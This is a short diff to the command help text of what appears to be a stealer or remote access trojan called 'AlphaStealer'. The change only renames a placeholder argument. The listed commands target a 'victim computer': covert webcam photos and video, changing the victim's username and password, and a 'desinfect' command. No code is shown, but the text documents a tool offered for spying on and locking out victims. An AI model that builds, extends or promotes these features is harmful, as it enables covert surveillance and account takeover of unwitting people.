@@ -75,7 +75,7 @@
 .photocam - Take a photo with the webcam.
 .videocam - Take a video with the webcam.
 .usernamefucker <new name> - Change the username the victim computer.
-.userpassfucker <new name> - Change the password the victim computer.
+.userpassfucker <new pass> - Change the password the victim computer.
 .desinfect - Desinfect victim computer.
 
 𝕬𝖑𝖕𝖍𝖆𝕾𝖙𝖊𝖆𝖑𝖊𝖗 - 𝕮𝖔𝖒𝖒𝖆𝖓𝖉𝖘 (𝖕𝖆𝖗𝖙 4)
